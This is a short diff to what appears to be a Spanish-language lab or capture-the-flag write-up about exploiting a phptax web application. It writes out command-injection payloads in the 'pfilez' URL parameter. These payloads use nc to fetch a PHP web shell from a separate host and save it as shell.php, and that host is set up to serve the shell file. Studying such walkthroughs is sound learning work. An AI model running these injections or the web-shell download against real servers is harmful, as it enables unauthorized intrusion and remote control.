@@ -11,3 +11,9 @@ pChart2.1.3/index.php
 Por arte de magia, tras no saber qué hacer, leo de un writeup que hay que usar el User Agent de Internet Explorer 6.1 (Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)) así que tiro por ahí, y veo un directorio nada más acceder a la IP: /phptax/
 
 /phptax/index.php?pfilez=1040d1-pg2.tob;pwd > pwd.txt";&pdf=make
+/phptax/index.php?pfilez=1040d1-pg2.tob;printf "GET http://192.168.111.128/phpshell.php HTTP/1.0\r\n\r\n" > get.txt
+cp phpshell.php /var/www/html
+service apache2 start
+/phptax/index.php?pfilez=1040d1-pg2.tob;nc 192.168.111.128 80 < get.txt > shell.php
+
+
